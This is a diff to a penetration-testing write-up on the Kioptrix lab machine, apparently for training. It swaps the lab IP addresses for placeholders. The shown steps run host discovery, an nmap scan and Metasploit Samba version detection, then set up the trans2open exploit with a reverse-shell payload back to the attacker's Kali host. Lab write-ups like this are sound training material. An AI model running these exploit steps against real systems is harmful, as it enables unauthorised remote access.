@@ -26,7 +26,7 @@ sudo netdiscover -r 192.168.56.0/24
 The scan revealed the following live host:
 
 ```
-192.168.56.102
+<TARGET_IP>
 ```
 
 This IP address was identified as the Kioptrix target machine.
@@ -40,7 +40,7 @@ This IP address was identified as the Kioptrix target machine.
 To identify open services, I performed a full TCP scan:
 
 ```bash
-sudo nmap -sS -sV -sC -p- 192.168.56.102
+sudo nmap -sS -sV -sC -p- <TARGET_IP>
 ```
 
 Relevant open ports:
@@ -64,7 +64,7 @@ To determine the exact version of Samba, I used Metasploit:
 ```bash
 msfconsole
 use auxiliary/scanner/smb/smb_version
-set RHOSTS 192.168.56.102
+set RHOSTS <TARGET_IP>
 run
 ```
 
@@ -91,8 +91,8 @@ use exploit/linux/samba/trans2open
 ### 4.2 Exploit Configuration
 
 ```bash
-set RHOSTS 192.168.56.102
-set LHOST 192.168.56.101
+set RHOSTS <TARGET_IP>
+set LHOST <KALI_IP>
 set LPORT 4444
 set PAYLOAD linux/x86/shell_reverse_tcp
 run
